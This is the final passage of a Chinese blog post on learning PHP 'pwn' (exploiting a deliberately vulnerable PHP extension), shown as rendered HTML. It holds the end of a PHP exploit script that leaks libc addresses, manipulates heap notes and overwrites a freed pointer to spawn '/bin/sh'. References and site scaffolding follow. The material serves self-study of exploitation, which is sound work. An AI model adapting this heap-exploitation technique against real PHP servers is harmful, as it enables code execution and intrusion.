<span class="variable">$line</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$found1</span> &amp;&amp; <span class="variable">$found2</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">sscanf</span>(<span class="variable">$line1</span>, <span class="string">&quot;%x&quot;</span>, <span class="variable">$addr1</span>);</span><br><span class="line"><span class="title function_ invoke__">sscanf</span>(<span class="variable">$line2</span>, <span class="string">&quot;%x&quot;</span>, <span class="variable">$addr2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Libc Address: 0x&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$addr1</span>) . PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Apple Address: 0x&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$addr2</span>) . PHP_EOL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">GetNote</span>(<span class="number">0</span>, <span class="number">0x60</span>);</span><br><span class="line"><span class="title function_ invoke__">GetNote</span>(<span class="number">1</span>, <span class="number">0x60</span>);</span><br><span class="line"><span class="title function_ invoke__">GetNote</span>(<span class="number">2</span>, <span class="number">0x100</span>);</span><br><span class="line"><span class="title function_ invoke__">GetNote</span>(<span class="number">3</span>, <span class="number">0x100</span>);</span><br><span class="line"><span class="title function_ invoke__">GetNote</span>(<span class="number">4</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">EditNote</span>(<span class="number">4</span>, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ThrowNote</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ThrowNote</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = [</span><br><span class="line">    <span class="variable">$addr2</span> + <span class="number">0x5050</span></span><br><span class="line">];</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;Q*&quot;</span>,...<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">EditNote</span>(<span class="number">1</span>, <span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">GetNote</span>(<span class="number">0</span>, <span class="number">0x60</span>);</span><br><span class="line"><span class="title function_ invoke__">GetNote</span>(<span class="number">1</span>, <span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = [</span><br><span class="line">    <span class="variable">$addr1</span> + <span class="number">0x53110</span></span><br><span class="line">];</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;Q*&quot;</span>,...<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">EditNote</span>(<span class="number">1</span>, <span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ThrowNote</span>(<span class="number">4</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a class="link"   target="_blank" rel="noopener" href="https://hornos3.github.io/2024/06/19/PHP-pwn-%E5%AD%A6%E4%B9%A0-1/" >PHP pwn 学习 (1)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-286446.htm" >[原创]php pwn分析与phpgdb插件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a target="_blank" rel="noopener" href="https://www.zyxy.net/archives/12582">PHP <code>Extension</code> 开发：用 C 语言扩展 PHP 功能与性能优化</a></p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 从零开始的 PHP PWN 学习</li>
+        <li><strong>Author:</strong> Findkey</li>
+        <li><strong>Created at
+                :</strong> 2026-04-02 18:00:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-04-03 12:38:45
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://find-key.github.io/2026/04/02/php-pwn/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/PHP/">#PHP</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/12/08/vm/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">VM helper</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">从零开始的 PHP PWN 学习</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#docker-%E7%8E%AF%E5%A2%83"><span class="nav-text">docker 环境</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E5%86%99-PHP-%E6%8B%93%E5%B1%95"><span class="nav-text">编写 PHP 拓展</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%8E%8B-php-%E6%BA%90%E7%A0%81"><span class="nav-text">解压 php 源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E6%8B%93%E5%B1%95%E6%A8%A1%E6%9D%BF"><span class="nav-text">生成拓展模板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9"><span class="nav-text">权限修改</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E5%BB%BA"><span class="nav-text">构建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%86%85%E5%AE%B9"><span class="nav-text">自定义内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E7%A0%94%E7%A9%B6"><span class="nav-text">漏洞简单研究</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Findkey</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        12 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
